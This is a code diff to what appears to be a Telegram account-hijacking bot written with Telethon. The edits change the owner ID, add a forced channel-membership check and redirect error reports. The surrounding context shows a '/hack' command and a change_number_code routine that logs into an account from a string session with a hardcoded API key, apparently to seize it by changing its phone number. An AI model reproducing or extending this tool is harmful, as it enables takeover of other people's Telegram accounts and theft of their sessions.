@@ -21,8 +21,18 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1967548493
+legendx = 511112479
 
+async def check(channel, uid):
+    try:
+        result = await bot(
+            functions.channels.GetParticipantRequest(
+                channel=channel, user_id=uid
+            )
+        )
+        return True
+    except telethon.errors.rpcerrorlist.UserNotParticipantError:
+      return False
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
@@ -392,7 +402,7 @@ async def start(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @ATGKDiscuss\n**LOGS**\n" + str(e))
 
     else:
       await event.respond("Wrong Text Found Re type /hack and use")
